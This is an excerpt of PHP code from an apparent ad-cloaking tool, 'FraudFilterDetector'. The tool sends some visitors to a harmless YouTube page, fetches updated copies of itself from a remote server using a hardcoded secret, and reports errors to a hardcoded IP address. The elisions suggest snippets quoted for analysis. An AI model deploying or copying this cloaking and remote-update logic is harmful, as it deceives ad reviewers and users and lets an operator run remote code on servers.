...
class FraudFilterDetector_ogmuk {
    ...
    function isSignatureValid($sign, $time) {
        $str = '5753d112-62d4-435d-8f91-7178b3b38691.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.youtube.com/watch?v=m5z_o_jYWHM');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 5753d112-62d4-435d-8f91-7178b3b38691',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 5753d112-62d4-435d-8f91-7178b3b38691';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 5753d112-62d4-435d-8f91-7178b3b38691';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ogmuk&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_ogmuk = new FraudFilterDetector_ogmuk();
$fraudFilterDetector_ogmuk->check();
